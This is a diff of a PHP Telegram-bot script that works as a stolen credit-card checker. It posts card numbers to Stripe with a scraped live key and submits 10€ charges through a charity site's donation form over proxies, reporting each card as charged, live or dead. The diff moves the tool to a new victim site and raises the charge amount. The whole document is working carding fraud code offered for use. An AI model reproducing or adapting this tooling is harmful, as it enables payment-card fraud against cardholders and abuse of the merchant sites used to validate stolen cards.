@@ -115,7 +115,7 @@ $last4 = substr($cc, -4);
 
 $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 1€
+Gateway: STRIPE CHARGE 10€
 Status: <code>□□□□□ 0%[⬜]</code>
 Req: <code>@$username</code>
 </b>");
@@ -193,7 +193,7 @@ $pass = passwordGen();
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 1€
+Gateway: STRIPE CHARGE 10€
 Status: <code>■□□□□ 20%[🟥]</code>
 Req: <code>@$username</code>
 </b>");
@@ -279,7 +279,7 @@ if($state=="Alabama"){ $state="AL";
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 1€
+Gateway: STRIPE CHARGE 10€
 Status: <code>■■■□□ 50%[🟧]</code>
 Req: <code>@$username</code>
 </b>");
@@ -315,7 +315,7 @@ $type =strtoupper(GetStr($fim, '"type":"', '"'));
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 1€
+Gateway: STRIPE CHARGE 10€
 Status: <code>■■■■□ 80%[🟨]</code>
 Req: <code>@$username</code>
 </b>");
@@ -348,7 +348,9 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=30e9143d-51a9-40cd-827d-dbcc26436186feb6f0&sid=88ab0241-26a3-4451-be17-0b62b53b0bb9db0d8c&pasted_fields=number&payment_user_agent=stripe.js%2F365d97fb0d%3B+stripe-js-v3%2F365d97fb0d%3B+card-element&referrer=https%3A%2F%2F4growth.ie&time_on_page=53012&key=pk_live_51MyEluL0N1NGI24Z3ZkBHoWgMC6qQcifatnDVJaaxJUrYDG37gxQRwlLq4xk7SUYJIYy7WsRzDllpp0nWsLRCiYM00w54obkT4');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=f75b9595-f264-4024-98c1-dc669c1b458dc168ac&sid=c4385391-c559-4858-aaed-a794d4cf6df90e7e64&pasted_fields=number&payment_user_agent=stripe.js%2Ff1e630ef91%3B+stripe-js-v3%2Ff1e630ef91%3B+card-element&referrer=https%3A%2F%2Fippocrateorg.org&time_on_page=451792&key=pk_live_51JK6VDJiGnlh74mKQ1GiryS1MKnx7TasDKIMiUguYxCnGH3XhTpZca1AVm6tEDURDthJyRjT7NQDf93TRK4edQ2Q001UmGE3dT');
+
+
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -357,7 +359,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://4growth.ie/wp-admin/admin-ajax.php?t=1706521616563');
+curl_setopt($ch, CURLOPT_URL, 'https://ippocrateorg.org/wp-admin/admin-ajax.php?t=1711055909949');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -368,24 +370,27 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1706521616563 h2',
-'Host: 4growth.ie',
+'POST /wp-admin/admin-ajax.php?t=1711055909949 h2',
+'Host: ippocrateorg.org',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://4growth.ie',
+'origin: https://ippocrateorg.org',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://4growth.ie/pay-invoice-online/',
-'accept-language: en-US,en;q=0.9',));
+'referer: https://ippocrateorg.org/en/fai-una-donazione/',
+'accept-language: en-US,en;q=0.9',
+   ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2000486%26_fluentform_4005_fluentformnonce%3Dffb5a23019%26_wp_http_referer%3D%252Fpay-invoice-online%252F%26names%255Bfirst_name%255D%3D'.$firstname.'%26names%255Blast_name%255D%3D'.$lastname.'%26email%3D'.$email.'%26phone%3D'.$phone.'%26input_text%3D1%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__entry_intermediate_hash%3D74933510dd303333be969d6d68795fb8%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=4005');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D732%26_fluentform_8_fluentformnonce%3D470dca4f25%26_wp_http_referer%3D%252Ffai-una-donazione%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3D10%2520%25E2%2582%25AC%26custom-payment-amount_1%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=8');
 
 
 $result2 = curl_exec($ch);
+
+# -------------------- [2 REQ] -------------------#
 
 //==================req 2 end===============//
 
@@ -393,7 +398,7 @@ $result2 = curl_exec($ch);
 sleep(1);
     edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
 CC: <code>$lista</code>
-Gateway: STRIPE CHARGE 1€
+Gateway: STRIPE CHARGE 10€
 Status: <code>■■■■■ 100%[🟩]</code>
 Req: <code>@$username</code>
 </b>");
@@ -403,14 +408,14 @@ if (
     strpos($result2, "Thank you for becoming a member") !== false ||
     strpos($result2, 'Membership confirmed.') !== false ||
     strpos($result2, 'Membership Confirmation') !== false ||
-    strpos($result2, 'Thank you for your message.') !== false ||
+    strpos($result2, 'Thank you for your message. We will get in touch with you shortly') !== false ||
     strpos($result2, 'incorrect_zip') !== false ||
     strpos($result2, 'Success ') !== false ||
     strpos($result2, '"type":"one-time"') !== false ||
     strpos($result2, '/donations/thank_you?donation_number=') !== false
 ) {
 
-$resp = "<b>[火]Stripe Charge 1€ 🌩
+$resp = "<b>[火]Stripe Charge 10€ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: CCN Charged 🟢
@@ -436,7 +441,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {
 
 
-$resp = "<b>[火]Stripe Charge 1€ 🌩
+$resp = "<b>[火]Stripe Charge 10€ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -461,7 +466,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 
 
 elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
-$resp = "<b>[火]Stripe Charge 1€ 🌩
+$resp = "<b>[火]Stripe Charge 10€ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -485,7 +490,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 }
 
 elseif(strpos($result2, "Your card does not support this type of purchase.")) {
-$resp = "<b>[火]Stripe Charge 1€ 🌩
+$resp = "<b>[火]Stripe Charge 10€ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -509,7 +514,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 }
 
 elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
-$resp = "<b>[火]Stripe Charge 1€ 🌩
+$resp = "<b>[火]Stripe Charge 10€ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Live 🟢
@@ -534,7 +539,7 @@ edit_sent_message($chatId, $sent_message_id, $resp);
 
 
 else {
-$resp = "<b>[火]Stripe Charge 1€ 🌩
+$resp = "<b>[火]Stripe Charge 10€ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: Dead 🔴
